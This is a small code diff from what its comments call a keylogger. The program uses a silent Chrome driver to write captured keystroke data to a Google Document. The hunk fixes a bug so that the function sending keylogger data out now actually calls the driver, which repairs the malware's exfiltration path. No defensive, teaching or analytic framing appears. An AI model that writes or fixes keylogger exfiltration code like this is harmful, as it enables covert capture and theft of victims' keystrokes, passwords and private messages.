@@ -168,7 +168,7 @@ def get_driver():  # gets a silent Chrome driver
 
 
 def write_to_doc():  # writes keylogger data to the Google Document
-    driver = get_driver
+    driver = get_driver()
 
     while True:
         try:  # attempts to write to the Google Document
